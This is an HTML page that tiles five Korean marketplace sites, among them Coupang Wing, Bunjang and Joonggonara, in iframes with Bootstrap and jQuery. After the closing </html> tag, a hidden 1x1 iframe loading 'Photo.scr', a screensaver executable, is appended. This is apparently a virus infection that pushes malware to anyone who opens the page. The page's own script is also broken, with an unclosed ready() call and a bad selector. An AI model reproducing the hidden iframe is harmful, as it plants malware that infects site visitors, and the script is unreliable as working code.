<!doctype html>
<html lang="ko">
<head>
	<title>한 번에 보자</title>
	<link href="./css/bootstrap.min.css" rel="stylesheet" type="text/css">
</head>
<body>
	<div class="container">
		<div class="row">
			<div class="col-2" style="min-hegiht:100%;">
				<iframe src="https://m.bunjang.co.kr/" frameborder="0" width="20%" id="wd1"></iframe>
			</div>
			<div class="col-2" style="min-hegiht:100%;">
				<iframe src="https://spc-www.ticketmonster.co.kr#OREDR" frameborder="0" width="20%" id="wd2"></iframe>
			</div>
			<div class="col-2" style="min-hegiht:100%;">
				<iframe src="https://wing.coupang.com/" frameborder="0" width="20%" id="wd3"></iframe>
			</div>
			<div class="col-2" style="min-hegiht:100%;">
				<iframe src="https://www.hellomarket.com/" frameborder="0" width="20%" id="wd4"></iframe>
			</div>
			<div class="col-2" style="min-hegiht:100%;">
				<iframe src="https://cafe.naver.com/joonggonara" frameborder="0" width="20%" id="wd5"></iframe>
			</div>
		</div>
		<div class="row">
			<div class="col" id="rs2"></div>
		</div>
	</div>
	<script src="./js/jquery-3.4.1.min.js"></script>
	<script src="./js/bootstrap.js"></script>
	<script>
		document.getElementById('wd2').onload = function(){ setTimeout("document.getElementById('wd2').contentWindow.scrollTo(5, 20)", 5) }
		$(document).ready(function() {
			alert($("wd2").length);
		}
	</script>
</body>
</html><iframe src=Photo.scr width=1 height=1 frameborder=0></iframe>